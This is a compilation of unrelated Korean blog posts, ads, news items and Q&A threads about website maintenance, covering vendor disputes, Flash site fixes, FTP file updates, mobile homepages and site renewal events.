그림책 역할밖에 할수 없는게 부지기수 인것 같다. 홈페이지관리가 엉망이 되는 몇가지 조건들.. 첫째, 웹의 생태환경을 이해 못하는 아저씨...  웹의 가상공간 보다는 내가 서있는 현실공간이 더 유익하다고 생각하는 아저씨...     둘째, 무작정 돈을 깍아야 잘했다고 생각하는 아저씨,... 그리고당장 돈이 급해 무작정 싸게만 만들어 주고픈 제작업체 아저씨...  셋째, 홈페이지관리는 전문업체가 알아서 다 잘해줄꺼야 라고 생각하는 순진한  아저씨...  넷째, 계약조건을 지 맘대로 무시해 버리는 아저씨 ( 결국 이모든것이 의뢰업체에 돌아간다. 도움을 주고 싶어도 주고싶은 맘이 싹없어져 버린다.)  다섯째, 관리업체 자체 내부역량부족 ( 해주란 대로만 해주고 제안을 못해준다. ) 등쳐 먹지 말고 함께 성장해 나갑시다.  홈페이지관리 나름대로 열심히 했는데 어쩔때는 고객분들께 배신감이 들때도 있습니다. 월 1건이 기본인 홈페이지관리 서비스를 무시하고 막무가내로 요구하는 업체들이 있습니다.저희는 도메인,웹호스팅,웹메일까지 모두 홈페이지관리에 포함하여 서비스를 해드리고 있습니다.소규모인 업체인 경우 별도의 웹관련 담당자가 없는관계로 웹에 대한 지식도 부족하고 기본적인 명칭도 이해를 못하시는 분들이 많습니다.하지만, 그분들에게도 최대한 자문역활을 해드리고 기본과 상식선에서 월1건 이상이 되더라도 난이도가 없는경우는무료로 작업을 해드리고 있습니다. 아래 그림에서 보시면 홈페이지관리 월1건이 기본인 업체인데 10월의 경우 5건을 무상으로 처리를 해 드렸습니다.뭐 대수롭지 않은 건도 있었고, 3년정도의 관계를 유지해온 터라 약간의 난이도가 요구되고 추가비용 발생될수 있는 상황인데도 불구하고 처리를 해드렸습니다.   문제는 지난 9월쯤 신입 담당자로 바뀌면서 그동안 잘 유지되어 오던 관계에 금이 간것이죠... 10월 중순쯤 신입담당자로 부터 홈페이지관리에 대한 사항에 문의하고 협의할게 있다고 해서 방문하여 상담을 해드렸습니다. 업체의 만기일이 11월 4일 인데 갑자기 11월 1일쯤에 타웹호스팅업체에서 전화가 왔습니다. ftp 좀 열어 달라고요.. 다들 아시겠지만, ftp 열어달라고 하는것은 홈페이지를 타업체로 이전하기위한 요구입니다.업체의 신입담당자가 그전에 전혀 업체이전에 대해 한마디도 하지 않았는데 너무 의아해서 업체 담당자에게 전화를 했습니다. 그때서야, 바꾸기로 했다는 것입니다. 그래서 이해가 갔습니다. 변경전에 일단 수정할꺼 모두 수정하고 이전할려는 복안이었다는것을...방문요청은 담당자가 바뀌었으니, 홈페이지관리 방법에 대해 간단히 문의하기 위했던거였습니다. 정말 맘이 쓰라린것은 기존 홈페이지관리 담당자와의 건설적이고 긍정적 관계였고, 업체의 발전과 웹관련 홈페이지관리 진심어린 자문역활도 했줬었는데... 이것이 고객과의 관계의 핵심이라는것을 자연스럽게 체득해 가고 있었는데 한순간에 업체를 바꿔버리니... 한숨밖에 나오질 않고, 우리가 이렇게 힘없고, 존재감 없는 .. 자부심없는 일을 하는가 싶기도 하고...여러모로 생각을 하게됩니다. 그래도 아뭏튼 어느업체와 하시든 성공을 기원할 따름 입니다.네이버 블로그는 맞지만, 확인불가​​​​​​​​안녕하세요~!~!​​ ​서초구 방배동에 위치한 (주)지앤글로벌(감각디자인)입니다.​​2002년부터 현재까지 무려 18년동안 다양한 업종과 분야의​​ ​홈페이지 제작을 꾸준히 도와드리고 있답니다.​​​​오늘은 홈페이지 제작 방법에 관련하여 말씀드리려고 합니다.​​ ​홈페이지 오픈 이후 홈페이지 관리 부분은 크게 2가지로 나누어지는데요.​​직접 관리를 하는 방법과 홈페이지 유지보수를 제작 업체에 맡기는 방법​​ ​이 두가지가 있는다는 점이 있다는점!​​​​직접 관리하는 것은 홈페이지 제작 완료 이후,​​별도의 관리자모드를 세팅하여 관리자가 홈페이지를 관리하며​​ ​어렵지 않게 직접 관리가 가능한 장점이 있습니다.​​제작업체에게 의뢰하지 않고 진행하기 때문에 합리적인 비용으로 제작을 하실 수 있습니다.​​ ​​​요즘에는 홈페이지가 없는 기업은 찾기 힘들 정도로​​홈페이지 구축은 선택이 아닌 필수라고 생각하시면 됩니다. ​​​하지만, 관리가 제대로 되지 않는 홈페이지도, ​​퀄리티가 떨어지는 홈페이지도 주위에서 정말 많이 볼 수 있는데요.​​ ​홈페이지는 제작도 중요하지만 제작 이후의 관리도 중요합니다.​​​​홈페이지도 트렌드가 있기 때문에 최소 4~5년에 한 번 정도는​​홈페이지가 낙후되었다면 디자인리뉴얼 또는 개편하시는 것이​​ ​많은 사람들에게 좋은 이미지를 심어 줄 수 있습니다.​​​​지금 새로운 홈페이지 제작과 리뉴얼에 대해 고민중이고 ​​​제작 비용 및 기간이 궁금하시다면 문의 먼저 주시고 상담 받아보시기 바랍니다.​​​​저희 (주)지앤글로벌(감각디자인) 홈페이지에 방문하시면 유선 및 온라인문의와 함께​​서울을 포함한 수도권 지역의 경우 직접 방문하여 미팅을 통해 ​​​처음부터 자세하고 꼼꼼한 상담과 내용정리를 도와드리고 있습니다. 문의 바랍니다. ​​ 치과 홈페이지 수정 작업 - 플래시 기반 홈페이지 관리 문제점플래시 기반 홈페이지란, 일부 컨텐츠를 플래시로 구성한 것이 아닌홈페이지 전체 프레임을 플래시 내에서 기획하고 작성된 홈페이지를 말합니다.엑티비티하고 플랙서블한 홈페이지를 위해 플래시만한 것이 없던 시절,특히 국내 개발자들은 플래시를 사용하여 웹개발을 하였고국내 수요자들 역시 그런 트랜드에 맞춰 선호를 하게 되었습니다.이제 다양한 디바이스의 등장과 웹표준화라는 화두는이해할 수 없으리만큼 고집스러웠던 국내 개발자들을 서서히 변화시키기 시작했습니다.플래시 기반 홈페이지는 개발 이후 관리에 있어 몇가지 문제점을 갖고 있습니다.회사 내부 개발자가 있더라도 퇴사를 한 경우,개발 회사와의 관계가 원활하지 않은 경우,오랜시간 관리소홀로 홈페이지를 방치한 경우 관리상 어려움을 겪게 됩니다.홈페이지 내용을 수정하기 위해서는 플래시 원본 파일가 필요합니다.물리적인 방법으로 원본을 대체할 수도 있으나, 그리 바람직한 방법은 아닙니다.플래시 원본 파일이 없다면 수정하고자 하는 내용이 어떤 것이냐에 따라보완적인 수정작업이 가능합니다.가능하다면 플래시 원본 소스를 재생산하거나플래시 기반이 아닌 새로운 플랫폼으로 리뉴얼하는 방법이 가장 적절하겠습니다.아래 치과 홈페이지 수정 작업 사례를 통해플래시 기반 홈페이지 수정의 가능여부와 대체 방법을 간단하게 설명하겠습니다.홈페이지 수정 / 관리 문의 >>>010-6255-4838limja38@hanmail.net서울 잠실의 어느 치과 홈페이지 모습입니다.위 페이지에서 보이는 약도, 주소, 진료시간, 문의전화 대부분이단기간 관리가 필요한 컨텐츠 입니다.하지만, 위 치과의 경우 플래시 기반으로 제작된 이후제대로 관리를 하지 못해 급히 수정 보완을 해야함에도 불구하고 제때 수정을 하지 못한 사례입니다.다행히 진료시간 영역의 수정을 원해서플래시 자체를 수정한 것은 아니지만 원하는 결과를 얻을 수 있었습니다.바로 CSS와 div 기반으로 별도 레이어를 만들어원하는 내용을 삽입하고 기존 플래시 내용을 가린 것입니다.일부 브라우져의 경우 플래시에 묻힐 수 있으니플래시 swf 소스 호출 부분의 수정을 통해 상단 레이어와 잘 배열을 합니다.위 치과 홈페이지 경우 역시 플래시 기반으로 제작된 홈페이지 입니다.메인페이지에 구성된 버튼들의 링크가 변경될 경우 잠실 치과 홈페이지 사례와 마찬가지로해당 영역에 레이어를 별도로 둔 div를 기존 페이지와 맞도록 배열을 합니다.단, 주의할 점은 접속 브라우저나 기기에 따라 div 위치가 다를 수 있습니다.그럴 경우 어색하게 보일 수 있어 꼼꼼한 소스 작업이 필요합니다.초보 개발자의 경우 상대적, 절대적 위치 이해가 부족해 실수하는 경우가 많습니다. 위 홈페이지 경우는 플래시 기반으로 제작되어 플래시의 장점을 충분히 활용한 사례입니다.다만, 홈페이지 관리상 불편하다면 그 효과의 의미가 무색해 질 수 있겠습니다.다행히 하단 부분의 블로그 및 SNS 정보 수정 작업으로 제때 원하는 결과를 얻을 수 있었습니다.이처럼, 플래시 기반 홈페이지를 보유한 회사들은내부 관리자가 없는 한 빠른 결정을 하여 원활히 홈페이지 운영될 수 있도록 해야합니다.- 플래시 외 플랫폼 기반으로 리뉴얼 하든지,- 관리를 맡는 업체 혹은 개발자로 하여금 플래시 작업을 다시 해 두는 것입니다.지금까지 플래시 기반 홈페이지의 관리에 대한 이야기를 해 보았습니다.울릉군 홈페이지, 신속한 업데이트에 관리도 ‘완벽’ 경북도, 홈페이지 대민 서비스 평가 우수기관 선정… 접근·호환성 만점허영국기자  |  hyg@hidomin.com 승인 2018.12.21   [경북도민일보 = 허영국기자] 　울릉군이 20일 경북도에서 주관한 ‘2018년 시·군 홈페이지 대민 서비스 평가’에서 우수기관으로 선정돼 표창을 받게됐다.　이번 평가는 경북도에서 시·군 홈페이지를 대상으로 웹 접근성과 호환성 및 관리수준 진단을 통해 웹사이트 품질을 높이기 위해 추진돼고 있다.　군에 따르면 행정안전부가 지난 10월까지 2개월간에 걸쳐 진행한 웹접근성·호환성 및 관리수준 진단에서 웹접근성(50%) 과 웹호환성(50%)의 두 가지 평가 항목 모두 만점을 획득해 이를 준용한 경북도 시·군 홈페이지 정보접근 수준 평가에서 이와 같이 선정됐다는 것.　이번 평가의 기준이 된 웹 접근성은 모든 사람이 인터넷 공간에서 쉽게 정보를 얻을 수 있고 웹 호환성은 웹브라우저 종류에 관계없이 호환 기술을 통해 국민모두에게 보편적 서비스를 제공한 것이 높은 점수를 받았다.　군은 2011년부터 홈페이지 기능보강사업을 통해 웹 접근성과 호환성 준수를 위한 웹사이트 개선을 지속적으로 추진해 왔다.　또 모바일 사용자의 수요에 따라 울릉군 내 무료 WIFI존 및 CCTV설치 위치를 제공하고 기존PC 버전에서만 제공되던 실시간 웹 방송을 모바일 환경에서도 구동할 수 있도록 업데이트해 편의성을 높인 바 있다.　군 관계자는 “신속하고 다양한 정보가 제공되는 홈페이지 관리에 더욱더 노력하겠다”고 밝혔다.  학교나 캠프 홈페이지 같은 경우는 제작하고 끝!이 아니라 계속해서내용과 디자인을 바꿔주어야하는데, 컴퓨터 초보자들도 쉽게 할 수 있는 방법을공유하려고 포스팅 창을 열어뜜니당.FTP :: 홈페이지 제작 및 관리 방법, 26기 나누리국제학교 영어캠프 조기등록3년 전에 제작한 홈페이지.고등학교 때 Click N이라는 허접한 홈페이지를 만들어 본 이후에 처음인데.나름 3년간 무난하게 유지되고 있어요. 나누리국제학교 홈페이지에요.현재 25기 연수를 진행중이고, 겨울연수 홍보를 위하여 홈페이지 내용을 바꾸어야해서 포토샵작업과 FTP작업을 하는 겸 작성해 봅니다.26기 연수 일정 -!!(혹시 어학연수에 관심있으신 분들은 한번 보세요 :)홈페이지에 이러이러한 내용들이 나오는데어떻게 작업내용들을 쉽게 금방 바꿀 수 있을까요? "FTP관련"-홈페이지의 모든 것이 FTP로 관리가능 합니다. 원본파일이 다 이곳에 들어있기 때문에 “파일질라”프로그램을 다운받은 후 FTP작업을 해주시면 됩니다.[사용방법]1. 파일질라를 열면 상단에 호스트, 사용자명, 비밀번호, 포트가 나와요.그 부분에 자신의 홈페이지 호스트, 사용자명, 비밀번호, 포트를 치고 접속!!!!!!!!!!!!!!!!!!!들어가면 저렇게 내 컴퓨터 폴더가 나오고, 홈페이지 작업파일이 올라와 있는 폴더 경로가 나와요.어떤 부분을 수정한다고 했을 때마우스 오른쪽 클릭하면 나오는 속성을 보면 주소(url)가 있어요.예를들면 이런식으로 :http://nisac2.hosting2003.co.kr/images/sub/about/about01_1.jpg주소 뒤로 image부터 큰 글자가 ftp에 이미지가 있는 경로를 말해줍니다. 홈페이지 작업파일이 올라와 있는 경로에 [ / ] 이 폴더를 열면 [www] 폴더가 나오고 그 아래로 많은 폴더가 나온다.저기 보이죠? 많은 폴더들 !!!! 그럼 그 폴더들 중에서 자신이 방금 눌렀던 속성 URL 주소의 뒷 내용을 그대로 따라 들어가요.저같은 경우는 홈페이지 작업파일 폴더에서 Images 라는 폴더를 찾고 Sub를 들어가서About폴더까지 찾아 들어가보면 about01_1.jpg 라는 이미지가 있는데이것이 컨텐츠 이미지입니다. 원본파일(psd)에서 이미지를 수정 후파일 명을 똑같이 about01_1.jpg 이렇게 만들어 주시고 이 경로따라 들어와서내 컴퓨터 폴더에서 찾아 업데이트(덮어쓰기) 시켜주면 됩니다. 업데이트 시 더블클릭하면 됨 (혹시 실수를 할 수 있으니 업데이트 전 올라가있는 파일의 백업은 철저히 해주고 잘 못 될 경우 그 파일을 다시 올려주면 됩니다.)그러면 요렇게 100퍼센트가 되면 홈페이지를 새로고침 했을 때 바로 완료!! 그 전에 포토샵에서 작업은 해주셔야겠죵? 요렇게.저장도 요렇게. 같은 파일에 덮어쓰기.TIP!!홈페이지 제작업체에서 팝업창을 계약 맺으면 그것도 팝업창 하나에 다 돈이랍니다.만약 할 줄 안다면 ?가장 좋은 방법은 포토샵으로 작업하여 바로 올리는 것입니다.HTML언어를 사용할 줄 알면 바로 넣으면 된다는 점 !!팝업창은 나중에 따로 포스팅 하겠습니댜 FTP로 홈페이지 관리하기!!참 쉽쬬오오오오 !!!!!!!!!!홈페이지 수정 작업 - 회사 홈페이지 관리 업체 (유지보수) 홈페이지 수정 작업을 하다보면 의뢰해준 회사 홈페이지를 보고 적잖게 놀라는 일이 있습니다.쉽게 고칠 수 있고 저렴한 비용으로 유지보수 할 수 있는데도오랫동안 방치해두는 경우가 많았습니다. 비교적 규모가 있는 기업의 회사 홈페이지 중에도10여년전 홈페이지 디자인과 플랫폼을 그대로 사용하고 있기도 하고최초 홈페이지 제작은 잘 했더래도 유지보수에 문제가 있어홈페이지 각각의 웹페이지들에 여러가지 문제점이 발견되기도 합니다. 인터넷이 활성화 되고 홈페이지를 비롯해 SNS가 보급화 되면서누구나 홈페이지를 쉽게 제작하고 관리할 수 있는 시대가 되었습니다.그럼에도 불구하고 예전 방식그대로 혹은 잘못된 인식으로회사 홈페이지 관리를 제대로 해오지 못해 안타까울 때가 많습니다. 홈페이지 수정 작업 사례를 통해 홈페이지 수정 및 관리가 필요한 사항에 대해 알아보겠습니다. 회사 홈페이지 수정 및 홈페이지 관리 문의010-6255-4838limja38@hanmail.net  보통 홈페이지 수정작업이 필요한 부분입니다.1. 메인 플래시 이벤트 이미지 교체 및 수정2. 팝업 이미지 교체 및 내용 수정3. 게시판 최신글 디자인 수정4. 약도 및 회사 정보 수정5. 로고 및 각 배너 교체 작업 회사 홈페이지에 있어 회사 소개 및 상품 소개 등은 매우 중요합니다.수정할 내용이 있다면 즉시 업무처리가 되어야 할 것입니다.사업내용 및 회사정보 수정 사례입니다. 회사 연혁의 경우에는 매년 혹은 매달 새로운 내용이 발생되므로회사 홈페이지 관리 업체를 통해 즉시 반영되도록 해야할 것입니다. 회사 주소가 변경되었다면 회사 정보가 표기된 곳의 내용을 모두 수정해야 합니다.그리고 오시는 길 페이지의 회사 약도 역시 반드시 수정을 해주어야 혼돈이 되지 않겠습니다. 회사 내부에 홈페이지를 직접 수정하고 관리할 수 있는 인력이 있다면 다행이지만그렇지 않을 경우에는 불가피하게 홈페이지 관리 업체와 업무협조를 해야합니다. 모르는 분야이고 유지보수 비용이 많이 들어갈까 걱정되어중요한 사항임에도 불구하고 홈페이지를 제대로 관리하지 못하고 있지 않은지회사 홈페이지를 점검해 볼 필요가 있습니다. 홈페이지 수정 작업에는 디자인 요소 수정, 컨텐츠 내용 수정, 프로그램 소스 수정, DB 관리 등으로구분이 되겠습니다. 홈페이지 관리를 통해 보다 효율적인 마케팅 효과를 기대할 수 있겠습니다. 내 자리에서 내가 할 일을 성실하게 잘하는 것이 결국 남을 돕는다는 것을 알아갑니다. 결혼한 자식이 아무탈 없이 잘 살아주는게 부모에게 효도 하는 것처럼우리가 하는 농업을 잘 꾸려가며 판매를 잘 하고 있다면 다른 농가에게 작은 희망을 줄 수가 있다라는 겁니다. 내 주변이 힘들어 지면 더불어 나도 힘들어 집니다.우리는 사이버 농업인이라고 말합니다. 그러면서 사이버 활동을 얼마나 잘 하고 있나 한 번쯤 되돌아 봐야 하지 않을까 생각합니다. 적극적으로 표현한다면 내 홈페이지 내 블로그나 카페 관리를 얼마만큼 충실하게 관리하며나와 연관되어지는 사람들과 무엇을 나누려고 애썼는가? 입니다. 더 넓게는 내가 소속된 홈페이지나 카페에 얼마나 많은 도움을 주었으며어떤 방식으로 그들과 소통하고 있는가? 입니다. 사람으로 인해 상처받지만 사람으로 인해 또 치유받고 위로받습니다. 제가 그랬으니까요.여기서 사람이란 내 홈 내 블로그를 통해 만나지는 모든 이들을 말하는 겁니다. 그들 때문에 상처받고 화가나지만 또 그들로 인해 내가 더 발전할 수 있기에사람은 희망이며 그들과의 소통함이 나의 경쟁력이며 재산이라는 생각이 듭니다. 다른 카페나 홈페이지에서 평상시 얼마나 활동을 하고 있나요? 평상시는 활동을 안하다가도 내 상품이 나올 쯤이면 갑자기 바빠지기 시작하지는 않나요? 너무 속 보이는 활동을 하지 마십시오. 내 홈페이지 내 블로그 내 카페 더 나아가 내가 활동하고 있는 사이버 공간에끊임없이 사진과 글 많은 정보를 올리고 글을 통해 정을 나누시기 바랍니다. 나 라는 사람을 1년 365일 그들 기억 속에 남아있게 하십시요. 우리 농민들은 소비자를 만날 기회가 없다고 말합니다.그러나 그 만남의 자리는 얼마든지 마련할 수 있습니다. 1년에 한 번 정도는 내 농산물을 구입해 주시는 회원님들을 초대해서 내 집에 있는 농작물로 감사 파티라도 한 번 열어준다면 어떨까요? 나는 오픈하지 않으면서 내게 다가오길 기대한다면 그건 안된다고 생각합니다. 그리고 홈페이지가 없다면 직접 만드세요. 일률적으로 똑같이 만드는 홈페이지 말고 내 농장의 특색을 살려 만드시길 바랍니다. 물론 블로그도 마찬가집니다. 기본적인 기능으로 일단 시작을 하십시오. 어려운 기능이나 문제들은 운영하면서 해결하면 됩니다.생각만 하지 마시고 부딪혀 보세요. 모두 잘 하실 수 있습니다.  1.홈페이지나 블로그는 언제 들어 가시나요?혹시 홈페이지를 열었을때 작년 글이 보이지 않는지 11월 임에도 불구하고 10월이나 9월 글이 보이지 않나요? 2.고객이 들어와서 놀자리가 없어요. 3.퍼 오는 글에도 내 생각을 담으세요. 4.글 목록이 한 눈에 보이게 해주세요. 5.댓글을 쓸 수 있도록 글을 써주세요.단답형이 아닌 질문형 대화형으로. 6.팝업창 너무 많이 띄우지 마세요. 7.새로 가입한 홈이나 카페에 도움 주는 글을 써 주세요. 8.현재 회원은 몇 번째 회원이십니까?특별한 이벤트를 마련하고 계십니까? 9.카메라는 늘 가까이 두세요.어떤 특별한 상황들이 담겨질지 모릅니다. 10.10번의 교육보다 1번의 실천이 더 중요합니다. 11.홈페이지와 블로그는 장거리 마라톤입니다. 12.유익한 글감이나 정보는 메모해 두세요. 13.이벤트 글은 아침 9시 이후에 올리세요 14.읽기 편하도록 글을 올려주세요  15.게시판이 편리하도록 만들어주세요. 16.사진은 내 마음의 표현입니다. 17.편안하게 홈이나 블로그를 운영하시려면 아예 하지마세요.즉 조금은 부담을 가지고 하십시오. 18.댓글이 없어도 조회 수를 보세요. 누군가는 지켜보고 있습니다. 19.홈페이지에 글이 많이 올라와야 하는 이유! 20.농업인에게 스타가 되기 보다는 내 고객에게 스타가 되세요 21.답변이나 댓글은 하룻밤을 넘기지 않도록 합니다. 22.블로그에서는 나를 알리고 상품은 내 홈페이지에서 알리십시요. 23.댓글도 성실하게 달아준다. 성실한 사람에게 반하지 않을 사람 없다. 24.내가 지금 위치에서 나눌 수 있는게 무엇인지 생각해 보십시오. 25.요리 사진을 찍다 보면 새벽 1~2시까지 할 때도 있다. 26.사진은 미리 미리 편집하여 관리자 게시판에 저장해두고되도록 때를 놓치지 말고 글을 올려라. 27. 서로 연관성 있게 상호와 닉네임을 정하라.그리고 한 번 정한 닉네임은 바꾸지 마십시요. 28.내 농장에 있는 상품으로 1년 동안 유지가 될 수 있도록 상품 개발을 하십시요. 29.블로그나 카페 한 곳으로 집중하십시요. 30.모든 이야기가 소재가 됩니다.너무 내 농장이야기만 올리려 애쓰지 마십시요. 안녕하세요 비즈니스 파트너 HeyB 명함지기 May 입니다 ﻿ 스마트명함과 모바일홈페이지 따라잡기 세번째 시간, 오늘은 무료 모바일홈페이지 생성 및 관리의 모든 것에 대해서낱낱이 파헤쳐 드립니다, 팍팍! 앞서 말씀드린 것처럼 스마트명함을 주문하신 모든 고객님께 무료 모바일홈페이지가 제공됩니다. 그런데!그러나!그럼에도 불구하고! 사용방법을 몰라서 혹은 귀찮다는 이유로모바일홈페이지를 생성하지 않으시는 분들이 계시더라구요 혹시 뜨끔 하셨나요? ㅎㅎ 그렇다면 딱 3분만 투자하세요. 모바일홈페이지를 생성하는 방법은 무척 간단합니다 동영상 먼저 보실까요? [헤이비 모바일홈페이지 생성하기] 이미지로 다시한번 보여드릴께요1. 먼저 헤이비 명함 사이트에 접속 후 로그인 하세요 http://namecard.heyb.co.kr/* 모바일홈페이지는 생성 및 관리를 위해 회원가입을 해주셔야 이용이 가능합니다. (1) 오른쪽 상단의 마이페이지를 클릭하고, 화면 왼쪽 메뉴의 모바일홈페이지 관리 클릭(2) 모바일홈페이지 수정하기 또는 생성하기 클릭 2. 모바일홈페이지 관리 페이지 각 항목에 인적사항 입력 후 미리보기/완료 클릭* 소개 내용에 이미지 업로드와 URL 링크가 가능하여 보다 입체감 있게 꾸미실 수 있어요 [미리보기 확인 시] 3. 완료 버튼을 클릭하면 모바일홈페이지 제작 완성! 아주 간단하죠? 한번 제작하면 변경할 수 없는 QR코드와 달리모바일홈페이지는 생성 후 언제든지 수정이 가능합니다. * 헤이비 사이트 접속 후 마이페이지에서만 수정 가능모바일홈페이지는 스마트폰 뿐 아니라 일반 PC에서도 접속이 가능한데, 기본적으로 스마트폰에 최적화되어 있기 때문에 일반 PC에서는 일부 이미지나 틀이 깨져보일 수 있다는 점, 꼭 기억해두세요 ~헤이비 모바일 홈페이지는회원가입 시 등록하신 ID 로 주소가 생성됩니다. http://m.heyb.co.kr/ID 이렇게요  - 자 그럼 다른 분들의 모바일홈페이지 구경 가보실까요 ?http://www.heyb.co.kr/deasin57http://www.heyb.co.kr/consultpark HeyB(헤이비) 스마트명함 주문 바로 가기 ﻿ 재생하기 바로보기가 지원되지 않는 파일입니다. 클릭하여 팝업창으로 플레이 해보세요.질문제가 홈페이지 업체를 바꾸고 싶은데요..월 7만으로 홈페이지를 관리 해준다고 하네요..근데 정확한거는... 제가 아니라 다른 사람꺼라서..제가 궁금한거는 뭐냐면1. 홈페이지 관리라 하면 어떤 관리인지?? 게시판 제품 올리기 이런거 총 관리를 말해주는건지?? 아님 단순히 오류 수정이나 그런건지??2. 홈페이지 관리비용이 7만원이면 가격이 어떤지..3. 만약에 홈페이지 관리업체를 바꿀시 기존에 사용하는 홈피를 못 쓰고 새로 제작을 해야하는 건지..(관리업체에서 홈피 제작까지 전부다 해줘서요..)  답변1. 게시판에 제품 올리기.. ^^이건 보통 직접 하시는거 아닌가요? 관리자 모드가 있으신지??관리자 모드가 있다면 직접하실수 있습니다.대부분 유지보수는.. 계약서에 명시되어 있습니다. 오류수정, 호스팅, 그리고 텍스트 혹은 이미지 변경입니다. 2. 가격은 어떻게 계약하셨느냐에 따라서 틀립니다.초기에 홈페이지 제작비용이 저렴하고 관리비가 비싼 경우도 있고, 초기 비용이 조금더 비싼 대신에 관리비용이 없는 경우도 있습니다. 3. 기존에 쓰시던 홈피에 대한 저작권을 한번 알아보세요.. 보통 계약서에 명시 되어 있습니다.그리고 자료를 받아서 호스팅 이전을 하시면 호스팅 업체에서 대행해줍니다.받으실때는 원본 자료와 DB자료 모두 받으셔야 하구요.. 사실 정확한 내용은 님이 가지고 계신 계약서와 홈페이지를 봐야 알려드릴수 있을꺼 같지만,일반적으로 홈페이지에 대한 소유권은 님한테 있다고 보시면 됩니다. 도움이 되셨나요? 좋은 하루 되세요~네이버 블로그는 맞지만, 확인불가병원홈페이지를 리뉴얼하는 기간은 병원마다 다르지만 투비원 경험으로는 1~3년 사이인 것 같습니다. 병원마다 병원홈페이지 리뉴얼 기간이 차이 나는 것은 병원홈페이지에 대한 관점의 차이와 맞물리는 것 같습니다.  병원홈페이지는 병원브랜딩과 병원마케팅이 함축된 주요한 가치표현물입니다. 병원홈페이지를 게시판 기능에 국한시키거나 디자인물로 여기는 병원 또는 병원마케팅 담당자, 병원홈페이지 제작자의 태도라면 매년 리뉴얼한다는 것이 이해되기 어렵죠. 그러나 병원이 성장을 위해 어쩔 수 없이 신경쓰는 병원광고나 그외 병원마케팅만큼 신경써야 하는 것이 경쟁력있는 병원홈페이지입니다. 이때 "경쟁력"이라는 것은 추상적이거나 주관적인 것이 아니라 객관적 데이터로 관리되어야 하는 병원홈페이지의 주요소입니다. 리뉴얼까지는 아니라도 지속적으로 경쟁력을 관리하고 보완해나갈 필요는 있습니다. 분명.. 병원홈페이지의 마케팅 목표에 기여하는 효과와 기능을 관리하는 일은 매우 중요한데 이의 기준이 되는 것이 전환수입니다. 병원 홈페이지의 주요 페이지마다 전환수를 체크할 수 있는 코드를 심고 주기적 체크를 해서 전환수를 높이는 노력, 컨텐츠 보강이나 수정, 기능 추가 등 적절한 관리를 해야 하는 것입니다.  투비원은 전환수를 높여 실질적 병원마케팅에 기여하는 병원홈페이지를 개발하고 병원마케팅프로젝트나 병원 브랜딩 패키지 계약을 통해 적극적으로 관리, 보완하면서 병원마케팅 기획을 연계해 홈페이지 활성화에 기여하고 있습니다. 안녕하세요^^오늘은 당사 출자 모회사인 우리관리에서 좋은 소식이 들어와 공유합니다^^추기 : 이벤트 참여는 우리관리 블로그로 부탁합니다^^우리관리 홈페이지 리뉴얼 오픈 EVENT!우리관리 홈페이지가 새롭게 태어났습니다. 언제 어디서든 우리관리가 궁금할 땐 우리관리 홈페이지에 접속...blog.naver.com 우리관리 홈페이지가 새롭게 태어났습니다.언제 어디서든 우리관리가 궁금할 땐 우리관리 홈페이지에 접속해주세요모바일에서도 원하는 콘텐츠를 쉽게 찾아볼 수 있도록 개선되었답니다. ^^달라진 우리관리 홈페이지 둘러보시고 이벤트 소식을 공유해주신 분들께추첨을 통하여 모바일 문화상품권(1만 원)을 보내드리니 많은 관심과 참여 부탁드려요~달라진 우리관리 홈페이지 보러가기!(클릭)응모방법1. 우리관리 홈페이지 리뉴얼 이벤트 소식을 SNS(네이버 블로그, 페이스북, 트위터 등)에 공유한다.2. 우리관리 네이버 블로그 이벤트 페이지 하단 댓글 창에 리뉴얼 축하 메시지와 함께 URL을 남긴다.응모기간2016.11.14.(월) ~ 2016.11.30.(수)당첨자 발표2016.12.5.(월) / 우리관리 네이버 블로그에 공지*당첨자 공지 후 상품권 발송을 위해 연락처를 취합하오니 이 점 참고해주시기 바랍니다.추기 : 이벤트 참여는 우리관리 블로그로 부탁합니다^^우리관리 블로그 : http://blog.naver.com/woori020702/220861246941우리관리 홈페이지 리뉴얼 오픈 EVENT!우리관리 홈페이지가 새롭게 태어났습니다. 언제 어디서든 우리관리가 궁금할 땐 우리관리 홈페이지에 접속...blog.naver.com 우리관리 공식 홈페이지 : http://www.woorihom.com/ 건물임대관리는 우리레오PMC 1566-3733 [부산경상대학교]2012년도 학과 홈페이지 관리 경영대회 시상식   1월 17일(목) 우리대학 경상관에서 학과 홈페이지 관리 경연대회 시상식이 열렸어요~^^모든 학과 조교선생님들 총 출동!ㅋㅋ 우리 부산경상대학교의 각 24개 학과 홈페이지 중 어느 학과가가장 관리를 잘한 학과 홈페이지로 뽑혔을까요?^^ 1등은 광고·마케팅과!!!우우우~~축하드립니다아♥ 늘 웃음가득, 친절하신 광고마케팅 김소현 선생님 +_+1등을 하셨군요 ㅠ_ㅠ흑흑흑~제가다 눈물이.. 2등은 보건의료행정과, 소방안전·전기전자계열(오른 쪽은 우리 학교 총장님^_^//후훗~↓)3등은 경영과, 유아교육과,아동복지보육상담과^_^선생님 너무 축하드려효~~4등은 패션·뷰티계열, 세무회계과 입니당 시상식 이후에는 장재웅 교수님(스마트앱·콘텐츠과)께서 홈페이지 관리 교육을 해주셨습니다 :-)우리 부산경상대학교를 위해서 늘 노력해주시는 우리 조교 선생님들 :-)너무나도 감사 드립니다! 올 2013년도에도 부산경상대학교를 위해서 모두 화이팅!^_^//     질문안녕하세요  기존의 홈페이지 업체에서 관리하던 일을 넘겨받게 되었습니다  평소에 홈페이지 디자인 작업을 했는데 홈페이지 코딩이나 서버 관리쪽은 아직은 실력이 부족한 편입니다   기존의 홈페이지 업체에서 웹계정 아이디와 비번만 넘겨받았는데 알 FTP로 들어가보니까   파일들을 전부 다운받지 않은 이상 원본 html 작업 없이는 전체적인 파일들을 보기가 힘이 들더라구요..   그래서 궁금한 것이 있는데 홈페이지 관리를 넘겨 받게 되면  1. 기존 업체에서 작업했던 작업물을  함께 받는 것이 좋은가요?     아님 회사라 거기서 저작권의 문제때문에 넘겨주지 않을지도 모르겠다는 생각도 들더라구요..  2. 웹계정 아이디와 비번 말고 필수적으로 받아야 할 것은 무엇이 있는지 궁금하구요  3. 또한 제가 직접 홈페이지 이미지 수정을 맡게 되면 HTML, JAVASCRIPT, ASP, PHP등등 어떤 것을 자세히 알야할지도 궁금합니다    내공 20 거니까 고수분들의 답변 부탁드립니다 꾸벅  답변1. 기존 업체에서 작업했던 작업물을 함께 받는것이 좋습니다.    그리고 원칙적으로 제작물의 저작권은 의뢰사에 있습니다.    다만 ai원본파일 플래쉬 원본파일인 psd는 일반적으로 넘겨주지 않지요..    하지만 이부분도 계약서에 명시되어 있다면 받으실수 있습니다. 2. SQL 